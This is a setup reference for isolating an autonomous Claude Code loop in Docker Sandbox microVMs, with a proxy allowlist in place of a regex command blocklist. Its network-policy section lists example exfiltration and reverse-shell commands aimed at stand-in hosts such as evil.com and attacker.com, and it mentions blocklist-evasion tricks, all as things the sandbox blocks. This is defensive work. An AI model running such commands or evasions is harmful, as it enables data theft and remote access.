# Docker Sandbox Isolation — Ralph Loop Reference

> Replace the PreToolUse command blocklist with OS-level microVM isolation via Docker Sandboxes. This provides stronger safety guarantees for `--dangerously-skip-permissions` and removes per-tool-call hook overhead.

---

## Why sandbox instead of a blocklist

|                        | PreToolUse Blocklist                                                            | Docker Sandbox                                            |
| ---------------------- | ------------------------------------------------------------------------------- | --------------------------------------------------------- |
| Security model         | Regex pattern matching (bypassable via variable expansion, subshells, encoding) | Hypervisor-level VM boundary (not bypassable from inside) |
| Network safety         | Must enumerate exfiltration patterns                                            | Built-in proxy with domain allowlisting                   |
| Evasion resistance     | Weak — attacker can split commands, use `$'\x72\x6d'`, aliases                  | Strong — even `rm -rf /` only destroys the sandbox        |
| Per-iteration overhead | ~50-100ms (hook runs on every Bash tool call)                                   | ~1-2s (sandbox reconnect, amortized across tool calls)    |
| Maintenance burden     | Must keep pattern list updated as new attack vectors emerge                     | Zero — isolation is structural                            |

The blocklist (`pretooluse-hook-reference.md`) remains useful as documentation and as a fallback for environments without Docker Desktop.

---

## Prerequisites

- **Docker Desktop 4.58+** with Sandboxes enabled (Settings > Features in development > Enable Docker Sandboxes)
- macOS (primary, uses `virtualization.framework`), Windows (experimental, Hyper-V), or Linux (legacy container mode via Docker Desktop 4.57+)
- Claude Code CLI installed on host (for initial auth)
- Feature status: **Beta** — Claude Code is the most tested agent implementation

---

## Architecture

```
┌─ Host (macOS) ──────────────────────────────────────────────┐
│                                                             │
│  ralph.sh                                                   │
│    │                                                        │
│    ├── iteration 1: docker sandbox run ... -- -p "$PROMPT"  │
│    ├── iteration 2: docker sandbox run ... -- -p "$PROMPT"  │
│    └── ...                                                  │
│                                                             │
│  ~/.dclaude_state/        (shared auth/settings)           │
│    ├── .claude/                                             │
│    │   ├── settings.json                                    │
│    │   └── .credentials.json                                │
│    └── .claude.json                                         │
│                                                             │
│  target-project/           (synced bidirectionally)         │
│    ├── ralph/                                               │
│    │   ├── prd.json                                         │
│    │   ├── progress.txt                                     │
│    │   └── prompt.md                                        │
│    └── .ralph-active                                        │
│                                                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌─ Docker Sandbox microVM ──────────────────────────────┐  │
│  │                                                       │  │
│  │  User: agent (non-root, has sudo)                     │  │
│  │  Claude Code + --dangerously-skip-permissions         │  │
│  │                                                       │  │
│  │  Workspace: /Users/.../target-project (same abs path) │  │
│  │  Auth: symlinked from mounted ~/.dclaude_state       │  │
│  │                                                       │  │
│  │  Hooks active inside VM:                              │  │
│  │    ├── context_monitor.py  (PostToolUse)              │  │
│  │    └── stop_loop_reminder.py (Stop)                   │  │
│  │                                                       │  │
│  │  Network: filtered through host proxy                 │  │
│  │    host.docker.internal:3128                          │  │
│  │    ├── ALLOW: *.anthropic.com, github.com, ...        │  │
│  │    └── BLOCK: everything else                         │  │
│  └───────────────────────────────────────────────────────┘  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

Key properties:
- Each `docker sandbox run` in the same workspace **reconnects** to the existing sandbox (1:1 workspace-to-sandbox mapping)
- Each `claude -p` invocation is still a **fresh context window** (separate process inside the persistent sandbox)
- File sync is **bidirectional** at the same absolute path — `prd.json` and `progress.txt` written in iteration N are available in iteration N+1
- The sandbox's own Docker daemon is isolated — no access to host containers

---

## Setup

### 1. Create shared auth state directory

```bash
mkdir -p "$HOME/.dclaude_state/.claude"
echo '{}' > "$HOME/.dclaude_state/.claude.json"
```

> **Note:** Use `echo '{}'` not `touch`. An empty `.claude.json` causes JSON parse errors on sandbox startup.

### 2. Create and configure sandbox (create + exec + run)

> **Why not a custom Dockerfile?** Docker Sandbox VMs have a separate image store from the host Docker daemon. Locally-built images (`docker build -t dclaude:latest`) are not accessible inside the VM — `--pull-template never` does not help. See `sandbox-test-results.md` Step 6 for details.

Instead, use the stock `docker/sandbox-templates:claude-code` template (pulled from Docker Hub) and customize the live VM via `exec`:

```bash
# Step 1: Create sandbox with default template + auth state mount
docker sandbox create --name "$SANDBOX_NAME" claude "$PROJECT_DIR" "$HOME/.dclaude_state"

# Step 2: Set up auth symlinks inside the sandbox
docker sandbox exec -u root "$SANDBOX_NAME" bash -c '
  STATE_DIR="/Users/'"$USER"'/.dclaude_state"
  rm -rf /home/agent/.claude /home/agent/.claude.json 2>/dev/null || true
  ln -s "$STATE_DIR/.claude" /home/agent/.claude
  ln -s "$STATE_DIR/.claude.json" /home/agent/.claude.json
  chown -h agent:agent /home/agent/.claude /home/agent/.claude.json 2>/dev/null || true
'

# Step 3: Configure git identity
docker sandbox exec "$SANDBOX_NAME" bash -c '
  git config --global user.email "ralph@localhost"
  git config --global user.name "Ralph Loop"
'
```

Steps 1-3 run once per project. The sandbox persists across iterations — subsequent runs only need:

```bash
docker sandbox run "$SANDBOX_NAME" -- -p "$PROMPT"
```

In `ralph.sh`, guard with an existence check:

```bash
if ! docker sandbox ls 2>/dev/null | grep -q "$SANDBOX_NAME"; then
  # Steps 1-3 above (one-time setup)
fi
docker sandbox run "$SANDBOX_NAME" -- -p "$PROMPT"
```

### 3. Initial auth (one-time per machine)

The first `docker sandbox run` will fail with "Not logged in". Complete OAuth interactively:

```bash
docker sandbox run "$SANDBOX_NAME"
# Complete /login in the interactive session, then /exit
```

Credentials persist in `~/.dclaude_state/.claude/.credentials.json` and are shared across all project sandboxes via the symlinks. No re-login needed for new projects.

---

## Integration with ralph.sh

### Invocation change

The loop runner replaces direct `claude` calls with sandbox-wrapped calls using the create + exec + run pattern:

```bash
# Before (no sandbox)
claude -p "$PROMPT" --dangerously-skip-permissions

# After (sandbox mode) — see Setup section for one-time create + exec steps
docker sandbox run "$SANDBOX_NAME" -- -p "$PROMPT"
```

Notes:
- The sandbox is created once per project via `docker sandbox create` (see Setup section above)
- Auth and git config are set up once via `docker sandbox exec` after creation
- Subsequent iterations only need `docker sandbox run` — fast reconnect to existing sandbox
- `-- -p "$PROMPT"` passes args through to Claude inside the sandbox
- `--dangerously-skip-permissions` is already applied by the sandbox template

### Mode detection

`ralph.sh` should auto-detect Docker availability:

```bash
use_sandbox() {
  command -v docker >/dev/null 2>&1 \
    && docker sandbox ls >/dev/null 2>&1
}
```

CLI flags:
```
ralph.sh [OPTIONS]
  --sandbox        Force Docker Sandbox mode (error if unavailable)
  --no-sandbox     Force direct mode with PreToolUse hook blocklist
                   (default: auto-detect, prefer sandbox)
```

### Hooks inside the sandbox

The remaining hooks run inside the sandbox VM as the `agent` user:

| Hook                                       | Runs inside sandbox? | Notes                                                     |
| ------------------------------------------ | -------------------- | --------------------------------------------------------- |
| `context_monitor.py` (PostToolUse)         | Yes                  | Transcript file is local to the VM; works normally        |
| `stop_loop_reminder.py` (Stop)             | Yes                  | `git status` operates on synced workspace; works normally |
| `block_dangerous_commands.py` (PreToolUse) | **Removed**          | Sandbox makes it unnecessary                              |

The hooks are loaded from the plugin's `hooks.json` which is part of the project configuration synced into the sandbox.

---

## Network policy hardening

Default sandbox network: allows all HTTP/HTTPS outbound through the proxy. Block everything except what Claude needs:

```bash
SANDBOX_NAME="ralph-myproject"

docker sandbox network proxy "$SANDBOX_NAME" \
  --policy deny \
  --allow-host "*.anthropic.com" \
  --allow-host "platform.claude.com:443" \
  --allow-host "github.com" \
  --allow-host "*.githubusercontent.com" \
  --allow-host "api.github.com" \
  --allow-host "registry.npmjs.org" \
  --allow-host "pypi.org" \
  --allow-host "files.pythonhosted.org"
```

Add more hosts as needed for your project (private registries, CDNs, etc.). Non-HTTP protocols (raw TCP, UDP) are blocked by default — this neutralizes reverse shells, netcat, socat, etc. without any regex patterns.

Policy persists at `~/.docker/sandboxes/vm/<name>/proxy-config.json`.

### What the network policy blocks for free

Everything in categories 4, 5, and parts of 9 from `pretooluse-hook-reference.md`:
- `curl -d @/etc/passwd http://evil.com` — blocked unless `evil.com` is in allowlist
- `nc -e /bin/bash attacker.com 4444` — blocked (non-HTTP protocol)
- `bash -i >& /dev/tcp/10.0.0.1/8080` — blocked (non-HTTP)
- `scp`, `rsync`, `sftp`, `ftp` — blocked (non-HTTP)
- `ssh -R` tunneling — blocked (non-HTTP)
- `ngrok`, `cloudflared tunnel` — blocked unless explicitly allowed
- `python3 -m http.server` — runs inside VM, not reachable from outside

---

## The dclaude wrapper (optional convenience)

For interactive use outside of `ralph.sh`:

```bash
dclaude() {
  local workspace="${1:-.}"
  workspace="$(cd "$workspace" && pwd)"
  shift 2>/dev/null || true

  # Separate wrapper args from claude args
  [[ "${1:-}" == "--" ]] && shift

  local safe_name
  safe_name="dclaude-$(echo "$workspace" | sed 's#[^A-Za-z0-9._-]#_#g')"

  # One-time setup if sandbox doesn't exist
  if ! docker sandbox ls 2>/dev/null | grep -q "$safe_name"; then
    docker sandbox create --name "$safe_name" claude "$workspace" "$HOME/.dclaude_state"
    docker sandbox exec -u root "$safe_name" bash -c '
      STATE_DIR="$(ls -d /Users/*/.dclaude_state 2>/dev/null | head -1)"
      [ -n "$STATE_DIR" ] || exit 0
      rm -rf /home/agent/.claude /home/agent/.claude.json 2>/dev/null || true
      ln -s "$STATE_DIR/.claude" /home/agent/.claude
      ln -s "$STATE_DIR/.claude.json" /home/agent/.claude.json
      chown -h agent:agent /home/agent/.claude /home/agent/.claude.json 2>/dev/null || true
    '
  fi

  docker sandbox run "$safe_name" -- "$@"
}
```

Usage:
```bash
dclaude                          # TUI in current directory
dclaude /path/to/repo            # TUI in specific directory
dclaude . -- --resume            # Resume last session
dclaude . -- -p "prompt text"    # Headless/pipe mode
```

---

## Known caveats

### Auth conflicts with Max/Pro plans

The sandbox's host proxy injects credentials via `apiKeyHelper`. This can conflict with OAuth tokens from interactive login. Symptoms: 401 errors, repeated login prompts.

**Workaround**: Set `ANTHROPIC_API_KEY` as an environment variable instead of using interactive auth:
```bash
docker sandbox run -e ANTHROPIC_API_KEY="sk-ant-..." -t dclaude:latest claude .
```

Or set it in the entrypoint from a mounted secrets file. The symlink-based auth sharing approach described above works for interactive login but should be tested with your specific plan.

### File sync: host→sandbox overwrites are permanently ignored

Docker Sandboxes use Mutagen-based bidirectional file sync, not volume mounts. Sandbox→host sync works reliably (2-3s). However, **once Mutagen has synced a file into the sandbox, host-side overwrites of that same file are permanently ignored** — this is not a latency issue but a sync cache staleness bug. Even files the sandbox only read (never wrote) are affected. New files sync fine. See `sandbox-test-results.md` Step 4 for the full root cause analysis and follow-up tests A-G.

**Impact on Ralph Loop**: The default automated flow is unaffected (sandbox writes files, host only reads). The issue matters when a developer edits files on the host and expects the sandbox to see the changes — e.g., editing `prd.md` or `tasks.json` in VS Code during a pause, or hot-reloading `prompt.md`.

**Recommended pattern — stop/start on resume:**

The cleanest developer experience for IDE-based editing is to let the developer edit files normally on the host, then have `ralph.sh` stop and restart the sandbox before the next iteration. Stopping the sandbox forces Mutagen to re-snapshot the host filesystem, so all host changes are picked up on restart.

```bash
# ralph.sh resume-after-pause logic
if [ "$RESUMING_AFTER_PAUSE" = true ]; then
  echo "Resyncing sandbox with host files..."
  docker sandbox stop "$SANDBOX_NAME"
  # All host edits (prd.md, tasks.json, prompt.md, source files) are now picked up
fi
docker sandbox run "$SANDBOX_NAME" -- -p "$PROMPT"
```

Developer workflow:
1. Pause the ralph loop (Ctrl+C or let the current iteration finish)
2. Edit any files in VS Code / any editor — no special tooling needed
3. Resume the loop — `ralph.sh` detects the pause and does a stop/start cycle (~10s overhead)
4. The sandbox sees all host changes

This approach requires zero additional tooling (no file watchers, no editor extensions, no `exec` commands). The 10s stop/start overhead is a one-time cost per resume, not per file edit. For programmatic writes from `ralph.sh` itself (e.g., injecting feedback between iterations), use `docker sandbox exec` instead — see `sandbox-test-results.md` workaround 1.

**Other workarounds** (for cases where stop/start isn't suitable):

| Method | Use case |
|--------|----------|
| `docker sandbox exec -i $NAME bash -c 'cat > /project/file' < host-file` | Programmatic writes from scripts |
| `docker sandbox exec $NAME rm /project/file` then write on host | Delete-then-create for a single file |

See `sandbox-test-results.md` Step 4 for the full workaround matrix with confirmed test results.

### One sandbox per workspace

Docker enforces a 1:1 mapping between workspace path and sandbox. Running `ralph.sh` from the same project directory always reconnects to the same sandbox. This is desirable — the sandbox persists tools, caches, and state.

**Conflict scenario**: If you run `dclaude` interactively AND `ralph.sh` simultaneously on the same project, they'll contend for the same sandbox. Avoid this.

### Beta stability

Docker Sandboxes are a beta feature. The API surface (`docker sandbox run`, network policies, template format) may change between Docker Desktop releases. Pin your Docker Desktop version for production use.

### Docker Desktop licensing

Docker Desktop requires a paid subscription for organizations with >250 employees or >$10M revenue. This affects portability of the Ralph plugin to enterprise users who may not have Docker Desktop.

### Intel Mac issues

At least one reported issue with Docker Desktop 4.58.0 on Intel Macs. Apple Silicon is the primary development target.

---

## Fallback: PreToolUse hook mode

When Docker Sandboxes are unavailable, `ralph.sh --no-sandbox` falls back to running `claude` directly with `--dangerously-skip-permissions`. In this mode, safety depends on a PreToolUse hook (`block_dangerous_commands.py`) that pattern-matches commands against a blocklist. See `pretooluse-hook-reference.md` for the full pattern reference, implementation architecture, and evasion awareness notes.

The plugin tree for direct (non-sandbox) mode:
```
claude-code/plugins/ralph/
├── hooks/
│   ├── hooks.json                      # Wires all hooks
│   └── scripts/
│       ├── block_dangerous_commands.py  # Active in direct mode only
│       ├── context_monitor.py           # Always active
│       └── stop_loop_reminder.py        # Always active (ralph-only)
```

In sandbox mode, `block_dangerous_commands.py` is not wired — the sandbox provides stronger isolation. The `hooks.json` used in sandbox mode omits the PreToolUse entry.

---

## Summary of plan changes

| Plan section                               | Change                                                                         |
| ------------------------------------------ | ------------------------------------------------------------------------------ |
| Section 3 (`ralph.sh`)                     | Add `--sandbox`/`--no-sandbox` flags; default to sandbox when Docker available |
| Section 4a (`block_dangerous_commands.py`) | Keep as fallback, not primary safety mechanism                                 |
| Section 4 (`hooks.json`)                   | Keep PreToolUse entry for defense-in-depth / fallback                          |
| Prerequisites                              | Add Docker Desktop 4.58+ as recommended (not required)                         |
| New section                                | Docker Sandbox template + wrapper setup (`dclaude`)                            |
| New section                                | Network policy configuration                                                   |
| `ralph-init.sh`                            | Optionally configure network policy for the sandbox                            |
